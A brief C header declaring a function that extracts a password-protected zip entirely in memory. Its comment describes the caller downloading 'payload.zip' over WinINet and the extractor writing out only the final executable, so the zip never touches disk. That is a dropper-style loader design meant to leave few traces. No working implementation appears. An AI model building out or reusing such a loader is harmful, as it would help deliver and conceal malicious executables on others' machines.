#ifndef PAYLOAD_EXTRACT_H
#define PAYLOAD_EXTRACT_H

#include <windows.h>

/* ponytail: in-memory ZipCrypto extraction. The zip never touches disk —
   caller fetches payload.zip into a heap buffer (WinINet) and hands us the
   bytes; we decrypt + inflate in memory and write only the final exe. */
typedef void (*audit_fn)(const char *fmt, ...);
extern audit_fn g_audit_fn;

BOOL extract_payload_mem(const unsigned char *zip, size_t zipLen, const char *outExe, const char *pw);

#endif
